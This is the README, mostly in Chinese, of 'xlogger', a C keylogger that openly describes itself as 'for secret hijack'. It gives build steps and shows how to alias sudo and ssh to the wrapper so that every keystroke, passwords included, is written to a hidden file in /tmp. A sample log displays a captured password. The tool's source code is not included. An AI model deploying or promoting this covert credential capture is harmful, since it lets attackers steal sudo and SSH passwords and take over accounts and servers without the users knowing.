# xlogger

记录目标程序的所有键盘输入和终端输入输出的日志。

You know, For secret hijack。

```
#define TARGET_PROGRAM "/usr/bin/sudo"
alias sudo='/opt/xlogger'
sudo -s


#define TARGET_PROGRAM "/usr/bin/ssh"
alias sudo='/opt/xlogger'
ssh root@ssh.server.svc.local
```


## 编译

### 快速开始

```bash
# 查看所有可用命令
make help

# 一键自动编译（推荐）
make
```

Makefile 会自动：
- 检测操作系统和Linux发行版
- 检查依赖是否已安装
- 自动安装缺失的依赖（需要sudo权限）
- 使用正确的编译选项

### 查看系统信息

```bash
make setup
```

显示当前系统信息和手动安装依赖的命令。

### 手动安装依赖

如果不想自动安装，可以手动安装依赖：

```bash
make deps
```

### 支持的系统

**自动依赖安装支持：**
- Ubuntu/Debian: `libutil-dev`
- Fedora: `libutempter-devel`
- RHEL/CentOS: `libutempter-devel`
- Arch Linux: `util-linux`
- openSUSE: `libutil-devel`
- macOS: 无需额外依赖

**手动编译：**

如果自动编译失败，可以手动编译：

**Linux 系统：**
```bash
gcc -Wall -Wextra -std=c99 -O2 -o xlogger xlogger.c -lutil
```

**macOS 系统：**
```bash
gcc -Wall -Wextra -std=c99 -O2 -o xlogger xlogger.c -lutil
```

### Linux 环境测试

提供了一个自动化测试脚本来验证 Linux 环境下的编译和运行：

```bash
./test-linux.sh
```

此脚本会：
- 检查系统环境
- 自动安装依赖
- 编译程序
- 运行功能测试
- 验证所有功能正常工作

## 配置方法

### 环境变量配置（推荐）

不用修改代码，直接设置环境变量就行：

```bash
# 设置要监控的程序
export XPROGRAM="/usr/bin/ssh"

# 设置日志文件位置
export XLOGFILE="/tmp/my-xlogger.log"

# 然后正常使用
./xlogger user@server.com
```

常用的配置：
```bash
# 监控 SSH
export XPROGRAM="/usr/bin/ssh"
alias ssh='/path/to/xlogger'

# 监控 sudo
export XPROGRAM="/usr/bin/sudo" 
alias sudo='/path/to/xlogger'

# 监控其他程序
export XPROGRAM="/usr/bin/mysql"
```

### 代码配置（备选）

如果不想用环境变量，也可以改代码里的默认值：

```c
#define DEFAULT_XPROGRAM "/usr/bin/sudo"    // 默认程序
#define DEFAULT_XLOGFILE "/tmp/.xlogger.log" // 默认日志位置

static int log_keyboard_input = 1;    // 是否记录键盘输入
static int log_console_output = 0;    // 是否记录程序输出
```

## 使用示例

### 监控 SSH 连接
```bash
export XPROGRAM="/usr/bin/ssh"
export XLOGFILE="/var/log/ssh-monitor.log"
alias ssh='/path/to/xlogger'

# 以后使用 ssh 就会自动记录
ssh root@server.com
```

### 监控 sudo 操作
```bash
export XPROGRAM="/usr/bin/sudo" 
export XLOGFILE="/var/log/sudo-monitor.log"
alias sudo='/path/to/xlogger'

# 以后的 sudo 操作都会被记录
sudo su -
sudo rm -rf /tmp/*
```

## 日志格式

日志默认保存在 `/tmp/.xlogger.log`，格式如下：

```
[2024-01-15 10:30:15] INPUT: ssh root@server.com
[2024-01-15 10:30:16] OUTPUT: Password: 
[2024-01-15 10:30:20] INPUT: mypassword123
[2024-01-15 10:30:21] OUTPUT: Welcome to server.com
```
